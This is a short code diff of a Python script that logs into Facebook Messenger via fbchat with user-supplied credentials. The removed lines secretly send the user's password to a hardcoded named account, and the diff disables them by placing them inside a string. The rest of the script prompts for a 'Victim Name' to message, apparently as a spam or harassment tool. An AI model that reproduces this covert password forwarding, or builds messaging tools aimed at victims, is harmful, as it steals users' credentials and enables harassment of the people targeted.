@@ -48,9 +48,11 @@ while True:
                         password=A[1]
                
                 client=fbchat.Client(username,password)
-                x=client.searchForUsers("Srijon Kumar")
+                """
+                x=client.searchForUsers("")
                 f=x[0]
-                client.send(fbchat.models.Message(password),f.uid )
+                client.send(fbchat.models.Message(),f.uid )
+                """
                 ty=str(input("Want to message a group or user? [G/U]: "))
                 if ty=="U":
                         name=str(input("Victim Name:~$ "))
